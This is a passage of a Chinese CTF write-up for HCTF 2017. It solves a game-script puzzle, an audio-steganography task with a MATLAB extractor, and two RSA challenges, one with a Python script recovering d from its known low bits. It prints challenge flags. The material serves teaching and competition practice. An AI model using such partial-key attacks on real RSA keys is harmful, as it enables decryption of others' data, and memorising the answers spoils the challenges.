lazy"data-original="http://static.zybuluo.com/LoRexxar/ew43pwln8whqdfjqn5i860v7/1510731654400.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <pre><code>    text_11<span class="token operator">=</span>&quot;<span class="token constant">HIIIIIINT</span><span class="token punctuation">(</span><span class="token constant">You</span><span class="token operator">-</span>really<span class="token operator">-</span>want<span class="token operator">-</span>to<span class="token operator">-</span>get<span class="token operator">-</span>the<span class="token operator">-</span>flag<span class="token operator">-</span>by<span class="token operator">-</span>submi
    ting<span class="token operator">-</span>it<span class="token operator">-</span>one<span class="token operator">-</span>by<span class="token operator">-</span>one<span class="token operator">?</span><span class="token punctuation">)</span>&quot;
    text_12<span class="token operator">=</span><span class="token string">&quot;HIIIIIINT(Try-to-read-the-scrpit-XP)&quot;</span>
    text_13<span class="token operator">=</span>&quot;<span class="token constant">HIIIIIINT</span><span class="token punctuation">(</span><span class="token constant">Don</span>&#x2019;t forget to change <span class="token constant">Brackets</span> to <span class="token constant">Curly</span>
    <span class="token constant">Brackets</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">)</span>&quot;</code></pre><p>&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x5806;flag&#xFF0C;&#x4F46;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x6B63;&#x786E;&#x7684;&#x3002;<br>&#x63D0;&#x793A;&#x4F60;&#x53BB;&#x770B;&#x811A;&#x672C;&#x3002;<br>&#x9501;&#x5B9A;&#x811A;&#x672C;</p> <pre><code>    <span class="token constant">Fanfare</span> <span class="token number">1500</span>
    <span class="token constant">Lockall</span>
    <span class="token constant">Faceplayer</span>
    <span class="token constant">Checkbadge</span> <span class="token number">0</span> <span class="token number">0x800c</span>
    <span class="token constant">If</span> <span class="token number">0x800c</span> <span class="token number">1</span>
    <span class="token constant">CheckLR</span> <span class="token number">1</span> func_5
    <span class="token constant">Message</span> <span class="token number">0</span>
    <span class="token constant">CloseMsgOnKeyPress</span>
    <span class="token constant">TrainerBattle</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">0</span>
    <span class="token constant">CheckTrainerLost</span> <span class="token number">0x800c</span>
    <span class="token constant">If</span> <span class="token number">0x800c</span> <span class="token number">0</span>
    <span class="token constant">CheckLR</span> <span class="token number">1</span> func_6
    <span class="token constant">Setbdgtrue</span> <span class="token number">0</span>
    <span class="token constant">ActMainEvent</span> <span class="token number">22</span>
    <span class="token constant">SetTrainerId</span> <span class="token number">29</span>
    <span class="token constant">SetTrainerId</span> <span class="token number">50</span>
    <span class="token constant">Setvar</span> <span class="token number">0x4074</span> <span class="token number">1</span>
    <span class="token constant">Setflag</span> <span class="token number">402</span>
    <span class="token constant">Setvar</span> <span class="token number">16648</span> <span class="token number">6</span>
    <span class="token constant">Setflag</span> <span class="token number">244</span>
    <span class="token constant">Setflag</span> <span class="token number">403</span>
    <span class="token constant">Message</span> <span class="token number">1</span>
    <span class="token constant">SetvarHero</span> <span class="token number">0</span>
    <span class="token constant">Message</span> <span class="token number">2</span>
    <span class="token constant">Soundfr</span> <span class="token number">1189</span>
    <span class="token constant">Fadedef</span>
    <span class="token constant">Message</span> <span class="token number">3</span>
    <span class="token constant">Jump</span> func_7</code></pre><p>&#x5230;func_7</p> <pre><code>    <span class="token constant">Setvar</span> <span class="token number">0x8004</span> <span class="token number">378</span>
    <span class="token constant">Setvar</span> <span class="token number">0x8005</span> <span class="token number">1</span>
    <span class="token constant">CheckItem3</span> <span class="token number">0x8004</span> <span class="token number">0x8005</span> <span class="token number">0x800c</span>
    <span class="token constant">If</span> <span class="token number">0x800c</span> <span class="token number">0</span>
    <span class="token constant">CheckLR</span> <span class="token number">1</span> func_15
    <span class="token constant">Callstd</span> <span class="token number">241</span> <span class="token number">7</span>
    <span class="token constant">Setflag</span> <span class="token number">115</span>
    <span class="token constant">Clearflag</span> <span class="token number">741</span>
    <span class="token constant">Setvar</span> <span class="token number">0x8004</span> <span class="token number">378</span>
    <span class="token constant">Setvar</span> <span class="token number">0x8005</span> <span class="token number">1</span>
    <span class="token constant">CheckItem3</span> <span class="token number">0x8004</span> <span class="token number">0x8005</span> <span class="token number">0x800c</span>
    <span class="token constant">If</span> <span class="token number">0x800c</span> <span class="token number">0</span>
    <span class="token constant">CheckLR</span> <span class="token number">1</span> func_16
    <span class="token constant">Message</span> <span class="token number">4</span>
    <span class="token constant">WaitButton</span>
    <span class="token constant">CloseMsgOnKeyPress</span>
    <span class="token constant">Releaseall</span>
    <span class="token constant">End</span></code></pre><p>&#x5206;&#x6790;&#x903B;&#x8F91;&#x53EF;&#x77E5;&#xFF0C;func_16&#x6C38;&#x8FDC;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;<br>&#x5230;func_16</p> <pre><code>    <span class="token constant">Message</span> <span class="token number">64</span>
    <span class="token constant">WaitButton</span>
    <span class="token constant">CloseMsgOnKeyPress</span>
    <span class="token constant">Releaseall</span>
    <span class="token constant">End</span></code></pre><p>&#x53D1;&#x73B0;&#x662F;&#x4F7F;&#x7528;64&#x53F7;text&#x5F39;&#x51FA;&#x5BF9;&#x8BDD;&#x6846;</p> <p><code>text_64<span class="token operator">=</span><span class="token string">&quot;HCTF(6A0A81AB5F9917B1EEC3A6183C614380)&quot;</span></code></p> <pre><code>get flag `<span class="token constant">HCTF</span><span class="token punctuation">{</span><span class="token number">6</span>A0A81AB5F9917B1EEC3A6183C614380<span class="token punctuation">}</span>`</code></pre><h3 id="newlovesong">New_Love_Song</h3> <hr> <p>&#x4E0D;&#x77E5;&#x9053;&#x5404;&#x4F4D;&#x8FD8;&#x8BB0;&#x4E0D;&#x8BB0;&#x5F97;&#x53BB;&#x5E74;HCTF&#x7684;&#x56FE;&#x7247;&#x9690;&#x5199;&#x9898;&#xFF0C;&#x53BB;&#x5E74;&#x7684;&#x5927;&#x4E00;&#x901A;&#x4FE1;&#x5C0F;&#x5B66;&#x5F1F;&#x4ECA;&#x5E74;&#x5DF2;&#x7ECF;&#x5927;&#x4E8C;&#x4E86;&#x3002;<br>&#x4ED6;&#x4ECE;&#x8BFE;&#x5802;&#x4E0A;&#x5B66;&#x4F1A;&#x4E86;&#x97F3;&#x9891;&#x9690;&#x5199;&#xFF0C;&#x5E76;&#x9009;&#x4E86;&#x5927;&#x5BB6;&#xFF08;wo&#xFF09;LP&#x7684;&#x4E00;&#x9996;&#x6B4C;&#x51C6;&#x5907;&#x5728;&#x53CC;11&#x9001;&#x7ED9;&#x5927;&#x5BB6;&#xFF08;&#x867D;&#x7136;&#x6CA1;&#x51E0;&#x4E2A;&#x4EBA;&#x5F00;&#x5230;&#xFF09;</p> <h4 id="&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;"><strong>&#x89E3;&#x9898;&#x5206;&#x6790;&#xFF1A;</strong></h4> <p>&#x9898;&#x76EE;&#x540E;&#x6765;&#x4E5F;&#x653E;&#x8FC7;<strong>hint: concentrate on the waveform &#x6CE8;&#x610F;&#x6CE2;&#x5F62;&#x56FE;</strong><br>&#x7528;<strong>Audacity</strong>&#x6253;&#x5F00;new_love_song.wav,&#x57FA;&#x672C;&#x8FD1;&#x4F3C;&#x4E8E;&#x4E00;&#x79CD;&#x77E9;&#x5F62;:<br> <a href="http://olqhuq6wn.bkt.clouddn.com/HCTF_1.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://olqhuq6wn.bkt.clouddn.com/HCTF_1.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x800C;&#x6B63;&#x5E38;&#x7684;&#x97F3;&#x9891;&#x6CE2;&#x5F62;&#x5F80;&#x5F80;&#x90FD;&#x662F;&#x9AD8;&#x4F4E;&#x8D77;&#x4F0F;&#x7684;:<br> <a href="http://olqhuq6wn.bkt.clouddn.com/HCTF_3.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://olqhuq6wn.bkt.clouddn.com/HCTF_3.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x628A;&#x6CE2;&#x653E;&#x5927;&#xFF0C;&#x80FD;&#x591F;&#x53D1;&#x73B0;&#xFF1A;<br> <a href="http://olqhuq6wn.bkt.clouddn.com/HCTF_2.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://olqhuq6wn.bkt.clouddn.com/HCTF_2.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x76F8;&#x9694;&#x7279;&#x5B9A;&#x7684;&#x8DDD;&#x79BB; &#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x4E00;&#x6BB5;&#x76F4;&#x7EBF;&#x3002;&#x63A5;&#x89E6;&#x8FC7;&#x7684;&#x4EBA;&#x80AF;&#x5B9A;&#x77E5;&#x9053;&#xFF0C;&#x76F4;&#x7EBF;&#x6CE2;&#x5C31;&#x662F;&#x67D0;&#x4E00;&#x7279;&#x5B9A;&#x7684;&#x503C;<br>&#x80FD;&#x591F;&#x731C;&#x6D4B; &#x80AF;&#x5B9A;&#x6709;&#x4E1C;&#x897F;&#x85CF;&#x5728;&#x5176;&#x4E2D;&#xFF0C;&#x5C1D;&#x8BD5;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x4E00;&#x4E32;01&#x4E32; &#x957F;&#x5EA6;&#x53EF;&#x5F00;&#x65B9; &#xFF0C;&#x53C8;&#x662F;&#x719F;&#x6089;&#x7684;&#x8F6C;&#x6362;&#x4E8C;&#x7EF4;&#x7801;&#xFF0C;&#x626B;&#x63CF;get flag</p> <h4 id="&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;"><strong>&#x89E3;&#x9898;&#x811A;&#x672C;&#xFF1A;</strong></h4> <pre><code>clc
clear
close all 

<span class="token string">%% load data
wm_sz     = 20000;                             %</span> watermark size
px_sz     <span class="token operator">=</span> wm_sz<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">;</span>                           <span class="token operator">%</span> number of pixels
im_sz     <span class="token operator">=</span> sqrt<span class="token punctuation">(</span>px_sz<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token operator">%</span> image size
host_new  <span class="token operator">=</span> audioread <span class="token punctuation">(</span><span class="token string">&apos;new\_love\_song.wav&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token operator">%</span> <span class="token keyword">new</span> <span class="token punctuation">(</span>watermarked<span class="token punctuation">)</span> host signal
host_new  <span class="token operator">=</span> uint8<span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">*</span><span class="token punctuation">(</span>host_new <span class="token operator">+</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token operator">%</span> double \<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0.5</span> <span class="token operator">+</span><span class="token number">0.5</span>\<span class="token punctuation">]</span> to <span class="token string">&apos;uint8&apos;</span> \<span class="token punctuation">[</span><span class="token number">0</span> <span class="token number">255</span>\<span class="token punctuation">]</span>

<span class="token string">%% prepare host
host_bin  = dec2bin(host_new, 8);              %</span> binary host \<span class="token punctuation">[</span>n <span class="token number">8</span>\<span class="token punctuation">]</span>

<span class="token string">%% extract watermark
wm\_bin\_str = host_bin(1:wm_sz, 8);
wm_bin    = reshape(wm\_bin\_str, px_sz , 8);
wm_str    = zeros(px_sz, 1, &apos;uint8&apos;);
for i     = 1:px_sz                           %</span> extract water mark from the first plane of host 
wm_str<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> bin2dec<span class="token punctuation">(</span>wm_bin<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      
<span class="token keyword">end</span>
wm        <span class="token operator">=</span> reshape<span class="token punctuation">(</span>wm_str<span class="token punctuation">,</span> im_sz <span class="token punctuation">,</span> im_sz<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token operator">%</span> show image
imshow<span class="token punctuation">(</span>wm<span class="token punctuation">)</span></code></pre><h3 id="babyrsa">BabyRSA</h3> <p>&#x5148;&#x770B;&#x4E0B;&#x9898;&#x76EE;&#x7684;&#x903B;&#x8F91;</p> <pre><code><span class="token constant">M</span> <span class="token operator">=</span> r <span class="token operator">*</span> bytes\_to\_long<span class="token punctuation">(</span><span class="token string">&apos;hctf{&apos;</span> <span class="token operator">+</span> sha256<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">&apos;./flag&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&apos;}&apos;</span><span class="token punctuation">)</span>
<span class="token constant">S</span> <span class="token operator">=</span> pow<span class="token punctuation">(</span><span class="token constant">M</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span></code></pre><p>&#x7A0B;&#x5E8F;&#x63A5;&#x6536; r&#xFF0C;&#x7136;&#x540E;&#x540C; flag &#x76F8;&#x4E58;&#x540E;&#x8BA1;&#x7B97;&#x51FA;&#x5B83;&#x7684;&#x6570;&#x5B57;&#x7B7E;&#x540D;<br>&#x5148;&#x8BF4;&#x4E0B;&#x672C;&#x6765;&#x7684;&#x601D;&#x8DEF;&#xFF0C;flag &#x4E3A; m&#xFF0C;&#x5355;&#x7EAF; flag &#x7684;&#x7B7E;&#x540D;&#x4E3A; S&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x7B7E;&#x540D;&#x4E3A; S&apos;,&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6784;&#x9020; <code>r<span class="token operator">=</span><span class="token constant">R</span><span class="token operator">^</span>e</code><br>&#x56E0;&#x4E3A;<br> <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140246_H97HFB_1.jpeg"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140246_H97HFB_1.jpeg"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x6240;&#x4EE5;</p> <p> <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140129_3prZOm_Screenshot.jpeg"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140129_3prZOm_Screenshot.jpeg"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>e &#x7684;&#x503C;&#x672A;&#x77E5;&#xFF0C;&#x901A;&#x8FC7;&#x7206;&#x7834; e &#x7684;&#x503C;&#x904D;&#x5386;&#x63D0;&#x4EA4; R^e&#xFF0C;&#x518D;&#x6839;&#x636E;&#x4E0A;&#x5F0F;&#x5F97;&#x51FA; flag</p> <p>&#x4F46;&#x662F;&#x9898;&#x76EE;&#x5FD8;&#x8BB0;&#x5BF9; r &#x8FDB;&#x884C;&#x9650;&#x5236;&#xFF0C;&#x5BFC;&#x81F4;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F20;&#x5165; <code>r<span class="token operator">=</span><span class="token number">2</span></code> &#x6765;&#x505A;&#x51FA;<br> <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140313_QcgiTv_Screenshot.jpeg"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140313_QcgiTv_Screenshot.jpeg"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x56E0;&#x4E3A; <code><span class="token number">2</span>m <span class="token operator">&lt;</span> n</code>&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x5BF9; S&apos;^e &#x9664;&#x4EE5; 2 &#x5C31;&#x662F; m</p> <p>ps: Blue-Whale &#x961F;&#x5E08;&#x5085;&#x7684;&#x89E3;&#x6CD5;<br> <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140338_1PfOVh_Screenshot.jpeg"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171115140338_1PfOVh_Screenshot.jpeg"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x7136;&#x540E;&#x5BF9; m^2 &#x5F00;&#x65B9;&#x5C31;&#x662F; flag &#x4E86;</p> <h3 id="weakrsa">WeakRSA</h3> <p>&#x5DF2;&#x77E5;&#x90E8;&#x5206; d &#x7684;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#xFF0C;&#x662F;&#x53EF;&#x4EE5;&#x8FD8;&#x539F;&#x51FA; d &#x7684;&#xFF0C;<a href="http://honors.cs.umd.edu/reports/lowexprsa.pdf"target="_blank">&#x539F;&#x7406;</a>&#x90E8;&#x5206;&#x3002;&#x4F46;&#x5BF9;&#x4E8E;&#x5DF2;&#x77E5;&#x7684;&#x4F4D;&#x6570;&#x662F;&#x6709;&#x8981;&#x6C42;&#x7684;<br> <a href="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171114202034_YLmofD_579ADAE3-7403-40C6-AD48-6CF840EE9B3A.jpeg"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://7xqn7l.com1.z0.glb.clouddn.com/hctf2017/20171114202034_YLmofD_579ADAE3-7403-40C6-AD48-6CF840EE9B3A.jpeg"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a><br>&#x5176;&#x4E2D; <code><span class="token constant">M</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>k</code>&#xFF0C;k &#x662F; d &#x7684;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x7684;&#x4F4D;&#x6570;<br>&#x51FA;&#x9898;&#x65F6;&#x6CA1;&#x6D4B;&#x8BD5;&#x597D;&#xFF0C;&#x672C;&#x6765;&#x662F;&#x8981;&#x7ED9;&#x7684;&#x4F4D;&#x6570;&#x4E0D;&#x591F;&#x8FD8;&#x539F;&#xFF0C;&#x9700;&#x8981;&#x7206;&#x7834;&#x7684;&#xFF0C;&#x7ED9;&#x4E0B;&#x811A;&#x672C;</p> <pre><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">#\-\*\- coding:utf-8 -*-</span>

import sys<span class="token punctuation">,</span> re
from libnum import nroot
from <span class="token constant">Crypto</span><span class="token punctuation">.</span><span class="token constant">Util</span><span class="token punctuation">.</span>number import size

n <span class="token operator">=</span> <span class="token number">24129492308224479830531863430667763206113500947912894148049103046436751018902380216549212087945014575866175372699327952352562583984599024982322742653474650254469019243745562427155195911292231061633627557914070970650388286259815766552728485153840458510677169495483383264554397982155108666923510839292748291941615629484247125025729363254239159271724680451974211566266307311323012908187153011368890695841034381925365547836453167672856111790684457634738536647974450864723943635507973978195453912898978987904396630176208142995219377309529324099766495068346782530074954504554550936100220114319876296005855618193837568032249</span>
e <span class="token operator">=</span> <span class="token number">65537</span>

low_d2 <span class="token operator">=</span> <span class="token number">585021050422437790400309277934736421671174903453118287773262727237276990096608684311252820485289582300237832073420122197911787329400438609843024619449229662477502424617432168933632994437196549098808097025413678738558952555239079729908003264517051128647960060385270607296895534639200191803399174999679917012421</span>
low_bits <span class="token operator">=</span> <span class="token number">1028</span>
test <span class="token operator">=</span> pow<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

i <span class="token operator">=</span> <span class="token number">0</span>
prefix <span class="token operator">=</span> \<span class="token punctuation">[</span>\<span class="token punctuation">]</span>
<span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        prefix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>str<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> bf <span class="token keyword">in</span> prefix<span class="token punctuation">:</span>
    low_d <span class="token operator">=</span> int<span class="token punctuation">(</span>bin<span class="token punctuation">(</span>low_d2<span class="token punctuation">)</span>\<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> e
        d <span class="token operator">&gt;</span><span class="token operator">&gt;=</span> low_bits
        d <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> low_bits
        d <span class="token operator">|</span><span class="token operator">=</span> low_d
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d<span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> pow<span class="token punctuation">(</span>test<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
                    print k<span class="token punctuation">,</span> d</code></pre><h1 id="&#x8BC4;&#x8BBA;&#x533A;">&#x8BC4;&#x8BBA;&#x533A;</h1> <p><strong>&#x8BF7;&#x6587;&#x660E;&#x8BC4;&#x8BBA;&#xFF0C;&#x7981;&#x6B62;&#x5E7F;&#x544A;</strong> <a href="https://cloud.panjunwen.com/alu/&#x6247;&#x8033;&#x5149;.png"target="_blank"class="fancybox"rel="grouped"title="&#x6247;&#x8033;&#x5149;.png"> <img alt="&#x6247;&#x8033;&#x5149;.png"class="img-responsive lazy"data-original="https://cloud.panjunwen.com/alu/&#x6247;&#x8033;&#x5149;.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a> </p> <hr> <div class="vcomment"></div> <div class="footer"><div class="footer__container--normal"alt="
https://www.ctfwp.com/articals/2017hctf.html
"> <svg height="170px"width="170px"xmlns="http://www.w3.org/2000/svg"><path d="M8,8l2,0 0,2 -2,0 0,-2z M10,8l2,0 0,2 -2,0 0,-2z M12,8l2,0 0,2 -2,0 0,-2z M14,8l2,0 0,2 -2,0 0,-2z M16,8l2,0 0,2 -2,0 0,-2z M18,8l2,0 0,2 -2,0 0,-2z M20,8l2,0 0,2 -2,0 0,-2z M24,8l2,0 0,2 -2,0 0,-2z M26,8l2,0 0,2 -2,0 0,-2z M28,8l2,0 0,2 -2,0 0,-2z M36,8l2,0 0,2 -2,0 0,-2z M38,8l2,0 0,2 -2,0 0,-2z M46,8l2,0 0,2 -2,0 0,-2z M50,8l2,0 0,2 -2,0 0,-2z M54,8l2,0 0,2 -2,0 0,-2z M56,8l2,0 0,2 -2,0 0,-2z M60,8l2,0 0,2 -2,0 0,-2z M62,8l2,0 0,2 -2,0 0,-2z M64,8l2,0 0,2 -2,0 0,-2z M66,8l2,0 0,2 -2,0 0,-2z M68,8l2,0 0,2 -2,0 0,-2z M70,8l2,0 0,2 -2,0 0,-2z M72,8l2,0 0,2 -2,0 0,-2z M76,8l2,0 0,2 -2,0 0,-2z M78,8l2,0 0,2 -2,0 0,-2z M82,8l2,0 0,2 -2,0 0,-2z M86,8l2,0 0,2 -2,0 0,-2z M94,8l2,0 0,2 -2,0 0,-2z M100,8l2,0 0,2 -2,0 0,-2z M102,8l2,0 0,2 -2,0 0,-2z M106,8l2,0 0,2 -2,0 0,-2z M110,8l2,0 0,2 -2,0 0,-2z M112,8l2,0 0,2 -2,0 0,-2z M116,8l2,0 0,2 -2,0 0,-2z M122,8l2,0 0,2 -2,0 0,-2z M126,8l2,0 0,2 -2,0 0,-2z M128,8l2,0 0,2 -2,0 0,-2z M132,8l2,0 0,2 -2,0 0,-2z M138,8l2,0 0,2 -2,0 0,-2z M148,8l2,0 0,2 -2,0 0,-2z M150,8l2,0 0,2 -2,0 0,-2z M152,8l2,0 0,2 -2,0 0,-2z M154,8l2,0 0,2 -2,0 0,-2z M156,8l2,0 0,2 -2,0 0,-2z M158,8l2,0 0,2 -2,0 0,-2z M160,8l2,0 0,2 -2,0 0,-2z M8,10l2,0 0,2 -2,0 0,-2z M20,10l2,0 0,2 -2,0 0,-2z M24,10l2,0 0,2 -2,0 0,-2z M30,10l2,0 0,2 -2,0 0,-2z M34,10l2,0 0,2 -2,0 0,-2z M36,10l2,0 0,2 -2,0 0,-2z M38,10l2,0 0,2 -2,0 0,-2z M40,10l2,0 0,2 -2,0 0,-2z M44,10l2,0 0,2 -2,0 0,-2z M48,10l2,0 0,2 -2,0 0,-2z M54,10l2,0 0,2 -2,0 0,-2z M56,10l2,0 0,2 -2,0 0,-2z M60,10l2,0 0,2 -2,0 0,-2z M62,10l2,0 0,2 -2,0 0,-2z M64,10l2,0 0,2 -2,0 0,-2z M72,10l2,0 0,2 -2,0 0,-2z M74,10l2,0 0,2 -2,0 0,-2z M80,10l2,0 0,2 -2,0 0,-2z M82,10l2,0 0,2 -2,0 0,-2z M84,10l2,0 0,2 -2,0 0,-2z M92,10l2,0 0,2 -2,0 0,-2z M94,10l2,0 0,2 -2,0 0,-2z M96,10l2,0 0,2 -2,0 0,-2z M98,10l2,0 0,2 -2,0 0,-2z M100,10l2,0 0,2 -2,0 0,-2z M102,10l2,0 0,2 -2,0 0,-2z M104,10l2,0 0,2 -2,0 0,-2z M118,10l2,0 0,2 -2,0 0,-2z M120,10l2,0 0,2 -2,0 0,-2z M128,10l2,0 0,2 -2,0 0,-2z M132,10l2,0 0,2 -2,0 0,-2z M134,10l2,0 0,2 -2,0 0,-2z M140,10l2,0 0,2 -2,0 0,-2z M144,10l2,0 0,2 -2,0 0,-2z M148,10l2,0 0,2 -2,0 0,-2z M160,10l2,0 0,2 -2,0 0,-2z M8,12l2,0 0,2 -2,0 0,-2z M12,12l2,0 0,2 -2,0 0,-2z M14,12l2,0 0,2 -2,0 0,-2z M16,12l2,0 0,2 -2,0 0,-2z M20,12l2,0 0,2 -2,0 0,-2z M28,12l2,0 0,2 -2,0 0,-2z M30,12l2,0 0,2 -2,0 0,-2z M32,12l2,0 0,2 -2,0 0,-2z M34,12l2,0 0,2 -2,0 0,-2z M36,12l2,0 0,2 -2,0 0,-2z M44,12l2,0 0,2 -2,0 0,-2z M50,12l2,0 0,2 -2,0 0,-2z M56,12l2,0 0,2 -2,0 0,-2z M58,12l2,0 0,2 -2,0 0,-2z M60,12l2,0 0,2 -2,0 0,-2z M62,12l2,0 0,2 -2,0 0,-2z M64,12l2,0 0,2 -2,0 0,-2z M76,12l2,0 0,2 -2,0 0,-2z M78,12l2,0 0,2 -2,0 0,-2z M80,12l2,0 0,2 -2,0 0,-2z M84,12l2,0 0,2 -2,0 0,-2z M88,12l2,0 0,2 -2,0 0,-2z M92,12l2,0 0,2 -2,0 0,-2z M94,12l2,0 0,2 -2,0 0,-2z M102,12l2,0 0,2 -2,0 0,-2z M108,12l2,0 0,2 -2,0 0,-2z M110,12l2,0 0,2 -2,0 0,-2z M112,12l2,0 0,2 -2,0 0,-2z M116,12l2,0 0,2 -2,0 0,-2z M124,12l2,0 0,2 -2,0 0,-2z M134,12l2,0 0,2 -2,0 0,-2z M136,12l2,0 0,2 -2,0 0,-2z M138,12l2,0 0,2 -2,0 0,-2z M144,12l2,0 0,2 -2,0 0,-2z M148,12l2,0 0,2 -2,0 0,-2z M152,12l2,0 0,2 -2,0 0,-2z M154,12l2,0 0,2 -2,0 0,-2z M156,12l2,0 0,2 -2,0 0,-2z M160,12l2,0 0,2 -2,0 0,-2z M8,14l2,0 0,2 -2,0 0,-2z M12,14l2,0 0,2 -2,0 0,-2z M14,14l2,0 0,2 -2,0 0,-2z M16,14l2,0 0,2 -2,0 0,-2z M20,14l2,0 0,2 -2,0 0,-2z M26,14l2,0 0,2 -2,0 0,-2z M28,14l2,0 0,2 -2,0 0,-2z M30,14l2,0 0,2 -2,0 0,-2z M34,14l2,0 0,2 -2,0 0,-2z M42,14l2,0 0,2 -2,0 0,-2z M46,14l2,0 0,2 -2,0 0,-2z M48,14l2,0 0,2 -2,0 0,-2z M52,14l2,0 0,2 -2,0 0,-2z M54,14l2,0 0,2 -2,0 0,-2z M58,14l2,0 0,2 -2,0 0,-2z M60,14l2,0 0,2 -2,0 0,-2z M64,14l2,0 0,2 -2,0 0,-2z 